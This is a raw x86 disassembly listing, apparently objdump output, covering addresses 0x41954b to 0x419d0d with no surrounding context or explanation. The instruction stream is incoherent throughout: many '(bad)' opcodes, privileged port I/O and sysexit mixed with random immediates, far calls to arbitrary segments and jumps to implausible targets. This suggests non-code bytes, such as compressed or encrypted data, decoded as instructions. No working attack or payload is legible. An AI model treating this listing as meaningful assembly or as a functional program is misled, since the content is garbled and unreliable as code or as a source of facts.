  41954b:	mov    eax,fs
  41954d:	cld    
  41954e:	add    BYTE PTR [esi-0x8],cl
  419551:	je     0x41955a
  419553:	dec    ebp
  419554:	pop    eax
  419555:	int    0x59
  419557:	clc    
  419558:	push   ebx
  419559:	push   edi
  41955a:	push   edi
  41955b:	arpl   WORD PTR [ecx+esi*2],si
  41955e:	sbb    edx,edi
  419560:	stos   DWORD PTR es:[edi],eax
  419561:	addr16 loopne 0x41950e
  419564:	mov    ecx,0xa7283f49
  419569:	jb     0x419555
  41956b:	jecxz  0x4194ed
  41956d:	dec    edx
  41956e:	jmp    0x4195b5
  419570:	inc    ebp
  419571:	adc    eax,0xdf8c34eb
  419576:	cmp    BYTE PTR [ebx],ch
  419578:	mov    bl,0x9
  41957a:	bnd jp 0x4195f9
  41957d:	push   ss
  41957e:	imul   eax,DWORD PTR [ebx+0x111e157e],0xafd194b1
  419588:	lea    ecx,[ecx-0x4b]
  41958b:	cwde   
  41958c:	pop    ebx
  41958d:	retf   
  41958e:	gs push ds
  419590:	lods   al,BYTE PTR ds:[esi]
  419591:	mov    ebx,0x5f826c16
  419596:	arpl   WORD PTR [eax],bx
  419598:	ret    0x1d92
  41959b:	jl     0x41956b
  41959d:	lods   eax,DWORD PTR ds:[si]
  41959f:	clc    
  4195a0:	pop    ecx
  4195a1:	jns    0x41955a
  4195a3:	dec    eax
  4195a4:	mov    edi,0x942b7dcd
  4195a9:	dec    edi
  4195aa:	sar    bl,cl
  4195ac:	add    bh,bl
  4195ae:	inc    edx
  4195af:	push   esi
  4195b0:	mov    edx,0xe7f012b2
  4195b5:	mov    ebp,DWORD PTR [edi-0x3d6c49d3]
  4195bb:	dec    ebx
  4195bc:	je     0x41953e
  4195be:	cmp    ebx,DWORD PTR [ebx]
  4195c0:	push   0xd9ad1767
  4195c5:	mov    ebp,DWORD PTR ds:0x196df4bd
  4195cb:	sbb    DWORD PTR [ecx-0x5d1da552],edi
  4195d1:	sub    al,0x7b
  4195d3:	jmp    0x419575
  4195d5:	fistp  WORD PTR [edi-0x18c2ef4c]
  4195db:	mov    bl,0x57
  4195dd:	fsub   DWORD PTR [eax-0x6b208f2f]
  4195e3:	add    al,dl
  4195e5:	aad    0x3b
  4195e7:	mov    al,ds:0x1c5eac67
  4195ec:	out    0xb4,eax
  4195ee:	add    al,al
  4195f0:	dec    edx
  4195f1:	inc    esp
  4195f2:	scas   al,BYTE PTR es:[edi]
  4195f3:	adc    DWORD PTR [esi-0x4aee4472],esi
  4195f9:	xchg   DWORD PTR [ecx-0x542e0201],ecx
  4195ff:	adc    eax,esp
  419601:	push   cs
  419602:	lahf   
  419603:	push   ebp
  419604:	shr    BYTE PTR [esi],1
  419606:	test   BYTE PTR [ecx],0xea
  419609:	repz ror DWORD PTR [ebx-0x7f776057],cl
  419610:	inc    ebx
  419611:	or     bh,BYTE PTR [edx-0x51]
  419614:	sub    BYTE PTR [edi+0xf],dh
  419617:	(bad)  
  419618:	dec    esi
  419619:	mov    ecx,0xe447e289
  41961e:	dec    ecx
  41961f:	xor    ebp,DWORD PTR [edx+0x3bd5fe60]
  419625:	nop
  419626:	jmp    0xd96691fc
  41962b:	sub    al,0xca
  41962d:	xchg   ebp,eax
  41962e:	inc    eax
  41962f:	retf   0xb352
  419632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419633:	mov    ds:0xa54b5894,al
  419638:	fcom   QWORD PTR [edx+0x36]
  41963b:	push   cs
  41963c:	xor    ebp,edi
  41963e:	rcr    edi,cl
  419640:	in     al,dx
  419641:	mov    eax,0x64e0b8da
  419646:	mov    ah,0xa0
  419648:	mov    ch,0x9d
  41964a:	iret   
  41964b:	test   bh,ch
  41964d:	cs adc al,0xf7
  419650:	retf   0x6d16
  419653:	pushf  
  419654:	inc    ebx
  419655:	shl    DWORD PTR [ecx+edx*8-0x453085e2],1
  41965c:	lds    edi,FWORD PTR [esi]
  41965e:	call   0xa673682a
  419663:	pop    ebx
  419664:	adc    al,BYTE PTR [ebp-0x7ced5290]
  41966a:	or     ch,cl
  41966c:	fwait
  41966d:	shl    DWORD PTR [ebp-0x11cfd83e],0xee
  419674:	dec    eax
  419675:	push   eax
  419676:	sbb    ecx,esp
  419678:	xchg   ah,dh
  41967a:	pop    ecx
  41967b:	cmp    eax,0x8e0332c
  419680:	adc    eax,0x4efa6eb3
  419685:	inc    edx
  419686:	xor    ch,bh
  419688:	call   0x9cd2a7c8
  41968d:	test   al,0x9c
  41968f:	xchg   esp,eax
  419690:	and    DWORD PTR [ecx],eax
  419692:	ret    0xd9a0
  419695:	test   DWORD PTR [ebp+0x4c902be1],ebx
  41969b:	mov    BYTE PTR [edx-0x5f],dl
  41969e:	(bad)  
  41969f:	rcr    DWORD PTR [edx-0x40],1
  4196a2:	push   ebp
  4196a3:	jne    0x41969b
  4196a5:	and    cl,BYTE PTR [edx]
  4196a7:	loope  0x419726
  4196a9:	mov    cl,0xf9
  4196ab:	xchg   edi,eax
  4196ac:	push   ss
  4196ad:	(bad)  
  4196ae:	rol    BYTE PTR [ecx+0x6f6f4fe1],1
  4196b4:	pop    ebx
  4196b5:	mov    eax,0x45a6eca3
  4196ba:	outs   dx,BYTE PTR ds:[esi]
  4196bb:	sub    bl,0xb1
  4196be:	mov    ecx,0xcfda25af
  4196c3:	mov    dl,0x87
  4196c5:	ret    
  4196c6:	push   ax
  4196c8:	outs   dx,DWORD PTR ds:[esi]
  4196c9:	(bad)  [esi]
  4196cb:	xchg   edx,eax
  4196cc:	shl    BYTE PTR [edi+0x32],0x15
  4196d0:	jl     0x41971c
  4196d2:	ret    0x818c
  4196d5:	cmp    cl,BYTE PTR ss:[ecx+0x34852031]
  4196dc:	in     al,dx
  4196dd:	cmc    
  4196de:	push   ebp
  4196df:	into   
  4196e0:	icebp  
  4196e1:	shl    BYTE PTR [eiz*1-0x3197ddae],cl
  4196e8:	inc    edx
  4196e9:	mov    dl,0xa0
  4196eb:	sub    DWORD PTR [ecx],edi
  4196ed:	daa    
  4196ee:	xchg   edx,eax
  4196ef:	mov    ah,0xf0
  4196f1:	fs pop es
  4196f3:	(bad)  
  4196f5:	adc    eax,0xc217903c
  4196fa:	pop    ebp
  4196fb:	jnp    0x419714
  4196fd:	ins    BYTE PTR es:[edi],dx
  4196fe:	int3   
  4196ff:	popf   
  419700:	bound  ebp,QWORD PTR [ebp+0x3ffaf257]
  419706:	mov    ecx,0x4607f763
  41970b:	(bad)  
  41970d:	xchg   esi,eax
  41970e:	or     BYTE PTR [eax+0x23],0x54
  419712:	fcomp  DWORD PTR ds:0xc6fcf3e5
  419718:	cmp    eax,0x6b668e59
  41971d:	pop    ss
  41971e:	das    
  41971f:	inc    esp
  419720:	stos   DWORD PTR es:[edi],eax
  419721:	sub    DWORD PTR [ecx+0x10],ebx
  419724:	push   eax
  419725:	fdivr  DWORD PTR [ebx-0x62]
  419728:	cdq    
  419729:	loopne 0x41972a
  41972b:	call   0x1ba1c399
  419730:	sub    BYTE PTR [esp+ecx*2+0x22],dl
  419734:	and    DWORD PTR [edi-0x4d],0xa962f045
  41973b:	std    
  41973c:	aas    
  41973d:	in     eax,0x4
  41973f:	outs   dx,DWORD PTR ds:[esi]
  419740:	popa   
  419741:	dec    ebx
  419742:	xlat   BYTE PTR ds:[ebx]
  419743:	push   cs
  419744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419745:	sbb    al,BYTE PTR [edx]
  419747:	ja     0x419719
  419749:	or     DWORD PTR [ebp+0x56],0xffffffcb
  41974d:	test   DWORD PTR [ecx],esi
  41974f:	and    DWORD PTR ss:[eax+ebp*1],ebp
  419753:	imul   edi,eax,0x5b
  419756:	mov    ch,0x45
  419758:	sub    dl,BYTE PTR [edx-0x3c842f9b]
  41975e:	icebp  
  41975f:	and    eax,0x4499e781
  419764:	push   eax
  419765:	rol    BYTE PTR [ecx-0x4737f3d4],cl
  41976b:	push   cs
  41976c:	pop    ebp
  41976d:	mov    DWORD PTR [edx+0x65],eax
  419770:	mov    cl,0x20
  419772:	jne    0x419746
  419774:	mov    BYTE PTR [ecx],0xea
  419777:	ror    ebx,cl
  419779:	push   edx
  41977a:	sub    DWORD PTR [esi+0x7b649b51],0xffffffc0
  419781:	adc    dl,bl
  419783:	adc    esi,esi
  419785:	int3   
  419786:	mov    ecx,0x226a5534
  41978b:	adc    eax,0xc9c81c37
  419790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419791:	sbb    eax,DWORD PTR [ebp-0x484f3c11]
  419797:	sub    esi,DWORD PTR [ebx-0x71]
  41979a:	adc    ecx,ebp
  41979c:	sub    al,0x8e
  41979e:	xchg   edi,eax
  41979f:	cdq    
  4197a0:	std    
  4197a1:	dec    edi
  4197a2:	pop    edx
  4197a3:	fdivr  QWORD PTR ss:[edx+0x60]
  4197a7:	sahf   
  4197a8:	xchg   esp,eax
  4197a9:	or     DWORD PTR ss:[ecx+0x4561709e],0xffffffb2
  4197b1:	and    al,0xb5
  4197b3:	(bad)  
  4197b4:	ins    BYTE PTR es:[edi],dx
  4197b5:	xlat   BYTE PTR ds:[ebx]
  4197b6:	jno    0x4197d2
  4197b8:	sbb    eax,0xd407dde
  4197bd:	out    0xf0,eax
  4197bf:	in     eax,0x87
  4197c1:	jno    0x419794
  4197c3:	mov    DWORD PTR [esi+0x1047ede9],edx
  4197c9:	sub    edi,edx
  4197cb:	jno    0x419846
  4197cd:	jg     0xab7c3453
  4197d3:	cli    
  4197d4:	sub    DWORD PTR [ebp-0x72],0xffffff84
  4197d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d9:	aas    
  4197da:	rcl    BYTE PTR [edx+0x23],0x39
  4197de:	mov    eax,0x9f859234
  4197e3:	or     eax,0x3b2372fd
  4197e8:	add    ch,cl
  4197ea:	ffreep st(7)
  4197ec:	or     esi,esi
  4197ee:	push   edx
  4197ef:	adc    ah,BYTE PTR [ecx+0x64c81893]
  4197f5:	mov    edx,0xd33d9e53
  4197fa:	xchg   ebx,eax
  4197fb:	or     al,0xda
  4197fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197fe:	mov    ebp,0x15b38182
  419803:	retf   
  419804:	xchg   edi,eax
  419805:	pusha  
  419806:	push   ebx
  419807:	mov    DWORD PTR [eax],esp
  419809:	nop
  41980a:	mov    ecx,0x51c0f4a9
  41980f:	cmp    ax,si
  419812:	imul   edx,DWORD PTR [eax],0x5104a6e3
  419818:	mov    bl,0xd9
  41981a:	cmp    dl,0x4f
  41981d:	mov    ebp,0x836f88f5
  419822:	cmp    al,0x68
  419824:	adc    cl,BYTE PTR [edx+ecx*1+0x42]
  419828:	(bad)  
  419829:	arpl   di,sp
  41982b:	pushf  
  41982c:	arpl   WORD PTR [edi-0x49ae7bdb],si
  419832:	and    bh,ch
  419834:	cmp    al,0x48
  419836:	loop   0x419814
  419838:	or     ecx,DWORD PTR [esp+ebx*4-0x47]
  41983c:	ja     0x4197e9
  41983e:	shl    DWORD PTR [eax+eax*2-0x1246a3e9],cl
  419845:	jb     0x419831
  419847:	push   edx
  419848:	and    al,0x7f
  41984a:	shl    edi,1
  41984c:	mov    dl,0x42
  41984e:	mov    bl,0xbd
  419850:	cdq    
  419851:	sub    al,0xe6
  419853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419854:	push   ss
  419855:	xlat   BYTE PTR ds:[ebx]
  419856:	outs   dx,DWORD PTR ds:[esi]
  419857:	mov    es,eax
  419859:	retf   0xba1b
  41985c:	xchg   ebp,eax
  41985d:	inc    esi
  41985e:	lods   al,BYTE PTR ds:[esi]
  41985f:	loope  0x4197e6
  419861:	xchg   ebx,eax
  419862:	jmp    0x4197e8
  419864:	add    ah,BYTE PTR [eax]
  419866:	ficom  WORD PTR [ebx+0x50]
  419869:	jns    0x419870
  41986b:	daa    
  41986c:	es or  eax,0x70222454
  419872:	(bad)  
  419873:	mov    ah,0x81
  419875:	pop    eax
  419876:	add    al,0xcb
  419878:	(bad)  
  41987a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41987b:	rcl    BYTE PTR [edi+edx*1+0x17e9c59d],1
  419882:	mov    bl,0xcf
  419884:	fwait
  419885:	idiv   al
  419887:	mov    eax,0x518ad379
  41988c:	pop    eax
  41988d:	cdq    
  41988e:	in     eax,0x63
  419890:	je     0x4198a7
  419892:	leave  
  419893:	ins    DWORD PTR es:[edi],dx
  419894:	push   ds
  419895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419896:	(bad)  
  419898:	test   eax,ebx
  41989a:	add    BYTE PTR [eax+0x54],ch
  41989d:	xor    DWORD PTR [esi-0x6c],0xfffffffc
  4198a1:	call   FWORD PTR [ecx]
  4198a3:	daa    
  4198a4:	loop   0x41984f
  4198a6:	popa   
  4198a7:	mov    dl,0x95
  4198a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198aa:	call   0x70a:0x37edd718
  4198b1:	jle    0x419861
  4198b3:	aam    0xf4
  4198b5:	inc    ecx
  4198b6:	push   0xadf5be87
  4198bb:	xchg   esi,eax
  4198bc:	cmp    eax,0xbc03977b
  4198c1:	add    DWORD PTR [ebx+ebp*4+0x7db7f8e9],eax
  4198c8:	push   ebp
  4198c9:	rol    esi,0x6c
  4198cc:	das    
  4198cd:	lock out 0x67,eax
  4198d0:	sbb    cl,BYTE PTR [edi+0x26]
  4198d3:	jne    0x419882
  4198d5:	pop    es
  4198d6:	mov    edi,ecx
  4198d8:	mov    ecx,DWORD PTR [ebp+ebp*8+0x63d72d04]
  4198df:	sbb    ecx,eax
  4198e1:	mov    ah,0x9f
  4198e3:	and    ch,BYTE PTR [ebx+0x21d1232f]
  4198e9:	mov    bl,0x23
  4198eb:	push   esi
  4198ec:	fisttp QWORD PTR [ecx+0x6c]
  4198ef:	in     al,dx
  4198f0:	das    
  4198f1:	cld    
  4198f2:	out    0xfe,al
  4198f4:	icebp  
  4198f5:	push   eax
  4198f6:	pop    es
  4198f7:	push   cs
  4198f8:	dec    edi
  4198f9:	mov    esi,0xeb9df32d
  4198fe:	pop    es
  4198ff:	dec    esp
  419900:	mov    ch,0x2f
  419902:	test   eax,edx
  419904:	mov    esi,0x9108d126
  419909:	sysexit 
  41990b:	cmp    eax,0xa92a7b32
  419910:	sub    edi,DWORD PTR [esi+0x66]
  419913:	sub    al,0x2b
  419915:	jl     0x419913
  419917:	clc    
  419918:	pop    ebx
  419919:	push   edi
  41991a:	das    
  41991b:	bound  ecx,QWORD PTR ds:0x1b312f90
  419921:	stos   BYTE PTR es:[edi],al
  419922:	xor    BYTE PTR [edx],bl
  419924:	out    0x4,al
  419926:	sbb    eax,0x40489e2f
  41992b:	scas   eax,DWORD PTR es:[edi]
  41992c:	sub    eax,0x75d45df1
  419931:	outs   dx,DWORD PTR ds:[esi]
  419932:	es (bad) 
  419934:	adc    BYTE PTR [ebx+0x65],dl
  419937:	rol    BYTE PTR ds:0x93a99955,cl
  41993d:	out    0xe2,eax
  41993f:	addr16 int 0x31
  419942:	xor    DWORD PTR [eax-0xf],ebx
  419945:	mul    BYTE PTR [ebx+0x4a043895]
  41994b:	imul   eax,ebp,0xb
  41994e:	scas   al,BYTE PTR es:[edi]
  41994f:	shl    ebp,0xb0
  419952:	hlt    
  419953:	push   edi
  419954:	ror    ch,cl
  419956:	pop    edi
  419957:	inc    ebp
  419958:	fdivr  QWORD PTR ds:0x3e7cfedc
  41995e:	stos   BYTE PTR es:[edi],al
  41995f:	cli    
  419960:	enter  0xf109,0x62
  419964:	ret    0x1d50
  419967:	xor    al,0x64
  419969:	lds    eax,FWORD PTR [ecx]
  41996b:	cdq    
  41996c:	call   0x355f:0xcaa8ce30
  419973:	xor    cl,al
  419975:	add    al,0x77
  419977:	jecxz  0x4199b9
  419979:	mov    al,0x64
  41997b:	dec    ebx
  41997c:	lds    esp,FWORD PTR [edx-0x7e]
  41997f:	add    BYTE PTR [ecx],al
  419981:	jge    0x419991
  419983:	not    BYTE PTR [edx-0x8c6f822]
  419989:	pusha  
  41998a:	mov    ds:0x53f1f60f,eax
  41998f:	arpl   WORD PTR [edi+0x169c4695],bp
  419995:	push   ebx
  419996:	jmp    0x773ea055
  41999b:	or     DWORD PTR [eax-0x32c69fa],esp
  4199a1:	sub    eax,0x64417f84
  4199a6:	sub    eax,0xd6ad2cba
  4199ab:	pusha  
  4199ac:	iret   
  4199ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ae:	sub    eax,0xd297c37c
  4199b3:	jb     0x4199ad
  4199b5:	add    cl,bh
  4199b7:	and    ch,BYTE PTR [eax-0x6dce150b]
  4199bd:	in     eax,dx
  4199be:	cmp    BYTE PTR [edx-0x4b40aa2c],bh
  4199c4:	jne    0x4199c5
  4199c6:	scas   al,BYTE PTR es:[edi]
  4199c7:	xor    BYTE PTR ds:0x663eb177,0x69
  4199ce:	add    eax,0x827ac4f6
  4199d3:	pushf  
  4199d4:	mov    esi,0x10bf322f
  4199d9:	mov    edx,0xfc7b4396
  4199de:	xchg   edi,eax
  4199df:	les    esi,FWORD PTR [ebx]
  4199e1:	icebp  
  4199e2:	cmp    esi,edi
  4199e4:	aaa    
  4199e5:	dec    esi
  4199e6:	test   eax,0x6867496d
  4199eb:	(bad)  
  4199ec:	jmp    0x168050e4
  4199f1:	hlt    
  4199f2:	fst    DWORD PTR [eax]
  4199f4:	addr16 jg 0x4199e4
  4199f7:	nop
  4199f8:	or     edx,DWORD PTR [ebp-0x6336c57f]
  4199fe:	dec    edi
  4199ff:	fs pop ss
  419a01:	inc    eax
  419a02:	(bad)  
  419a03:	pop    edx
  419a04:	scas   al,BYTE PTR es:[edi]
  419a05:	xchg   BYTE PTR [ecx-0x7af372e6],dh
  419a0b:	dec    edx
  419a0c:	mov    ds:0x7f15975,al
  419a11:	xor    ebx,DWORD PTR [ebp*8+0x7340fd5e]
  419a18:	or     esp,DWORD PTR ds:0xa0e12b6
  419a1e:	iret   
  419a1f:	xor    al,0xc5
  419a21:	inc    ecx
  419a22:	dec    ebx
  419a23:	sar    BYTE PTR [ecx+0x48ec124f],cl
  419a29:	mov    ah,0xee
  419a2b:	(bad)  
  419a2c:	jbe    0x419a07
  419a2e:	and    BYTE PTR [eax],bh
  419a30:	mov    DWORD PTR [ecx-0xb6e896e],esp
  419a36:	and    ah,bl
  419a38:	test   BYTE PTR [eiz*8-0x471617b9],dl
  419a3f:	outs   dx,DWORD PTR ds:[esi]
  419a40:	dec    ebp
  419a41:	cdq    
  419a42:	add    DWORD PTR [ecx-0x7e0a54e8],0x61ca72cf
  419a4c:	sub    eax,0xdad70886
  419a51:	push   0xb103da88
  419a56:	xor    DWORD PTR [edx-0x61],ebx
  419a59:	jbe    0x419a7d
  419a5b:	adc    esi,eax
  419a5d:	cli    
  419a5e:	mov    edi,0x99d97d18
  419a63:	ins    DWORD PTR es:[edi],dx
  419a64:	push   eax
  419a65:	xor    ebx,DWORD PTR [ebx]
  419a67:	sar    ebx,1
  419a69:	xor    ah,ah
  419a6b:	mov    cl,BYTE PTR [ebx]
  419a6d:	loope  0x4199fb
  419a6f:	pushf  
  419a70:	daa    
  419a71:	adc    BYTE PTR [esi+edx*1],dl
  419a74:	sub    esi,ebp
  419a76:	clc    
  419a77:	xchg   ebx,eax
  419a78:	rol    DWORD PTR [edi+0x5a884bb5],1
  419a7e:	(bad)  
  419a7f:	sbb    cl,bl
  419a81:	sub    BYTE PTR [ebx],ah
  419a83:	jbe    0x419a25
  419a85:	or     ch,BYTE PTR ss:[ebx]
  419a88:	test   bl,bl
  419a8a:	inc    esi
  419a8b:	lods   eax,DWORD PTR ds:[esi]
  419a8c:	ror    ebp,cl
  419a8e:	pop    edx
  419a8f:	(bad)  
  419a90:	popa   
  419a91:	or     DWORD PTR [esi+0xd],edx
  419a94:	scas   al,BYTE PTR es:[edi]
  419a95:	mov    BYTE PTR [eax-0x65],0x24
  419a99:	shufps xmm7,XMMWORD PTR [ebx+ebx*8],0x64
  419a9e:	sub    edi,DWORD PTR [esi]
  419aa0:	je     0x419ad3
  419aa2:	ins    BYTE PTR es:[edi],dx
  419aa3:	ret    0xaa84
  419aa6:	scas   al,BYTE PTR es:[edi]
  419aa7:	pushf  
  419aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aa9:	mov    al,gs:0xdf0f7864
  419aaf:	out    dx,eax
  419ab0:	pusha  
  419ab1:	(bad)  
  419ab2:	push   ecx
  419ab3:	or     al,BYTE PTR [esp+ebp*8]
  419ab6:	and    bl,ch
  419ab8:	imul   ebp,edx,0xdf17d1e3
  419abe:	sub    esp,0xffffffc0
  419ac1:	xchg   DWORD PTR [edx],ebx
  419ac3:	sbb    al,0xd9
  419ac5:	or     ah,BYTE PTR [ecx]
  419ac7:	add    eax,0x64f0d50f
  419acc:	jge    0x419b23
  419ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419acf:	cdq    
  419ad0:	clc    
  419ad1:	mov    al,ds:0x582880fe
  419ad6:	addr16 popf 
  419ad8:	mov    dl,0xf4
  419ada:	push   esp
  419adb:	mov    DWORD PTR [edx-0x2a36c1fa],esi
  419ae1:	mov    edi,0xd4123203
  419ae6:	pop    esi
  419ae7:	les    eax,FWORD PTR [edi]
  419ae9:	pop    eax
  419aea:	pop    ebx
  419aeb:	mov    DWORD PTR [eax+0x42],edx
  419aee:	lods   al,BYTE PTR ds:[esi]
  419aef:	out    0x98,al
  419af1:	mov    dl,0xa7
  419af3:	mov    eax,cs:0xb55e18c1
  419af9:	mov    edi,0xa71bdfe9
  419afe:	jle    0x419aaa
  419b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b01:	ret    
  419b02:	adc    esi,DWORD PTR [edi+esi*2]
  419b05:	adc    ah,BYTE PTR [ebx+0x1d]
  419b08:	jge    0x419b5a
  419b0a:	adc    eax,DWORD PTR [eax+0xe]
  419b0d:	adc    edi,eax
  419b0f:	adc    cl,bl
  419b11:	retf   0xe346
  419b14:	jg     0x419b84
  419b16:	jecxz  0x419b68
  419b18:	jns    0x419b40
  419b1a:	xor    DWORD PTR cs:[esi+0x3eb50094],eax
  419b21:	xor    eax,0x4b9748ff
  419b26:	adc    DWORD PTR [edx+ecx*2+0x205d6193],0x7b
  419b2e:	lods   al,BYTE PTR ds:[esi]
  419b2f:	push   DWORD PTR [esi-0x2e4b7afa]
  419b35:	pop    esp
  419b36:	dec    eax
  419b37:	test   eax,0xbe04138a
  419b3c:	out    dx,al
  419b3d:	lods   eax,DWORD PTR ds:[esi]
  419b3e:	sbb    eax,0xc7cac9f2
  419b43:	cwde   
  419b44:	mov    DWORD PTR [edx+0x7a],esp
  419b47:	push   0xffffff82
  419b49:	xor    eax,0x90ed3b7d
  419b4e:	rcl    DWORD PTR [eax-0x3],cl
  419b51:	fstp   st(5)
  419b53:	push   0x1a
  419b55:	out    0xde,eax
  419b57:	xor    esp,edx
  419b59:	xor    edx,DWORD PTR [edi+0x2cd5c3ce]
  419b5f:	(bad)  
  419b60:	xchg   ebx,eax
  419b61:	stos   DWORD PTR es:[edi],eax
  419b62:	sub    cl,dl
  419b64:	sub    cl,cl
  419b66:	sbb    ch,BYTE PTR [eax+0xd5e4a03]
  419b6c:	xchg   ebx,eax
  419b6d:	aad    0xe0
  419b6f:	shr    edi,cl
  419b71:	out    0xc0,al
  419b73:	ret    
  419b74:	add    eax,0x4be12b6c
  419b79:	pop    ds
  419b7a:	dec    BYTE PTR [eax]
  419b7c:	adc    BYTE PTR [ebx+edi*1],bh
  419b7f:	and    al,0xcc
  419b81:	lea    esp,[ebx-0x39188f81]
  419b87:	inc    edi
  419b88:	data16 (bad) 
  419b8b:	test   BYTE PTR [esi-0x57f8866a],dh
  419b91:	shl    esp,cl
  419b93:	ja     0x419b43
  419b95:	or     BYTE PTR [ebx+0x5439b1b0],al
  419b9b:	jp     0x419c11
  419b9d:	push   ecx
  419b9e:	aaa    
  419b9f:	xchg   BYTE PTR [edi],dl
  419ba1:	fild   WORD PTR [esi+0x761f7522]
  419ba7:	inc    edx
  419ba8:	mov    ah,0xed
  419baa:	mov    ebp,0x63c5976c
  419baf:	jp     0x419bab
  419bb1:	cmp    eax,0x86092dcf
  419bb6:	mov    dl,0x36
  419bb8:	sti    
  419bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bba:	pop    ebp
  419bbb:	(bad)  
  419bbc:	adc    esp,DWORD PTR [edi+0x2b]
  419bbf:	lock ds jo 0x419b54
  419bc3:	loopne 0x419b70
  419bc5:	lock xchg esi,eax
  419bc7:	retf   
  419bc8:	push   edi
  419bc9:	inc    ebp
  419bca:	mov    ch,0xe1
  419bcc:	sub    edi,DWORD PTR [edi]
  419bce:	sub    al,BYTE PTR [esi-0x7d]
  419bd1:	icebp  
  419bd2:	sub    al,0x2a
  419bd4:	jp     0x419c32
  419bd6:	mov    esp,0xf1b046ff
  419bdb:	imul   ebp,DWORD PTR [ebp+0x3f],0x902975ea
  419be2:	mov    bl,0x5e
  419be4:	xlat   BYTE PTR ds:[ebx]
  419be5:	mov    ebx,0xceec2e5c
  419bea:	mov    al,0x12
  419bec:	ret    0x5ac9
  419bef:	inc    ecx
  419bf0:	jp     0x419bf1
  419bf2:	add    DWORD PTR [edi-0x1a1deb1f],0x9e7b679f
  419bfc:	inc    ebx
  419bfd:	cmp    eax,DWORD PTR [eax+0x6ae97564]
  419c03:	add    ebp,DWORD PTR [eax]
  419c05:	dec    edi
  419c06:	inc    edi
  419c07:	sub    cl,bh
  419c09:	mov    ebp,0x1e442eca
  419c0e:	mov    ah,0xbe
  419c10:	or     ecx,DWORD PTR [eax]
  419c12:	push   ecx
  419c13:	lock dec esp
  419c15:	mov    ah,0x3
  419c17:	inc    esp
  419c18:	test   DWORD PTR [ebp+0x50],esi
  419c1b:	mov    al,ds:0x17280894
  419c20:	aaa    
  419c21:	int    0x43
  419c23:	or     al,0xfa
  419c25:	(bad)  
  419c27:	cmp    eax,0x8b204521
  419c2c:	lods   eax,DWORD PTR ds:[esi]
  419c2d:	ins    DWORD PTR es:[edi],dx
  419c2e:	xchg   edi,eax
  419c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c30:	call   0xebc1:0xc7eee30
  419c37:	fld    DWORD PTR [ebp-0x52]
  419c3a:	js     0x419ca1
  419c3c:	(bad)  
  419c3d:	xlat   BYTE PTR ds:[ebx]
  419c3e:	enter  0x3054,0x0
  419c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c43:	sub    bh,BYTE PTR [esi+0x26eece71]
  419c49:	add    al,0x9a
  419c4b:	imul   esp,DWORD PTR [eax],0x7a945d9b
  419c51:	inc    ebx
  419c52:	or     al,0x9f
  419c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c55:	stc    
  419c56:	popf   
  419c57:	sar    BYTE PTR [ebx+0x2d],0xda
  419c5b:	in     eax,0xae
  419c5d:	inc    ecx
  419c5e:	sbb    eax,0xaed33e45
  419c63:	call   0x8294:0x61202aab
  419c6a:	adc    ch,bh
  419c6c:	mov    ecx,0x7974269a
  419c71:	adc    eax,0x9e3bf7c
  419c76:	sbb    eax,0x2ad99f44
  419c7b:	(bad)  
  419c7c:	int    0xe9
  419c7e:	push   0x2f
  419c80:	xchg   BYTE PTR [ebp+esi*1+0x16],al
  419c84:	adc    al,bl
  419c86:	pop    edi
  419c87:	jae    0x419c68
  419c89:	xor    cl,bl
  419c8b:	mov    edx,0x5d8b46d
  419c90:	pop    ecx
  419c91:	les    edi,FWORD PTR [edi+eiz*2+0x6b33afb6]
  419c98:	jns    0x419cba
  419c9a:	sub    edx,DWORD PTR [eax+0x61]
  419c9d:	adc    bl,bl
  419c9f:	das    
  419ca0:	cwde   
  419ca1:	shr    BYTE PTR [esi+0x3],0x23
  419ca5:	add    DWORD PTR [esi],ebp
  419ca7:	cld    
  419ca8:	pop    ss
  419ca9:	jbe    0x419c8b
  419cab:	mov    cl,0x3
  419cad:	jo     0x419ce2
  419caf:	fsub   st,st(1)
  419cb1:	inc    ecx
  419cb2:	xchg   esi,eax
  419cb3:	push   ebx
  419cb4:	cmp    bl,BYTE PTR fs:[ebx+0x14]
  419cb8:	iret   
  419cb9:	mov    eax,ds:0xce1f057a
  419cbe:	ja     0x419cb7
  419cc0:	push   0x7d
  419cc2:	mov    ah,0x43
  419cc4:	imul   esi,esi,0x2f6426f1
  419cca:	bound  edx,QWORD PTR [edx+ebx*8-0x2b]
  419cce:	pop    ds
  419ccf:	ja     0x419c92
  419cd1:	mov    eax,0x8b76ce15
  419cd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cd7:	adc    al,0x81
  419cd9:	std    
  419cda:	outs   dx,DWORD PTR ds:[esi]
  419cdb:	cs (bad) 
  419cdd:	outs   dx,DWORD PTR ds:[esi]
  419cde:	adc    edi,DWORD PTR [eax+0x6e6a04b9]
  419ce4:	out    0x10,al
  419ce6:	and    edx,esi
  419ce8:	add    al,0xfa
  419cea:	cli    
  419ceb:	xchg   ebx,eax
  419cec:	sete   BYTE PTR [ebp-0x47]
  419cf0:	add    dl,dh
  419cf2:	iret   
  419cf3:	or     BYTE PTR [esi],0x9f
  419cf6:	mov    ecx,0xda33df0b
  419cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cfc:	(bad)  
  419cfd:	in     eax,dx
  419cfe:	mov    ebp,0x1499fda9
  419d03:	and    BYTE PTR [ebx+0xec6b3af],bl
  419d09:	data16 shr BYTE PTR [esi+0xe],1
  419d0d:	int3   
